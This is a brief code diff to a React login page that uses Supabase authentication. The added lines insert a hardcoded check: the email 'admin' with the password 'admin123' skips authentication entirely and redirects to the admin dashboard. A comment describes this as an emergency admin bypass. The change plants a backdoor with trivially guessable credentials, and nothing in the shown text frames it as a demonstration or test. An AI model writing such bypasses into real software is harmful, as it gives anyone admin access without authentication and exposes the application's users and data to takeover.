@@ -19,6 +19,12 @@ export default function LoginPage() {
         setIsLoading(true);
         setError(null);
 
+        // Hardcoded bypass for emergency admin access
+        if (email === "admin" && password === "admin123") {
+            router.push("/admin/dashboard");
+            return;
+        }
+
         const { error } = await supabase.auth.signInWithPassword({
             email,
             password,
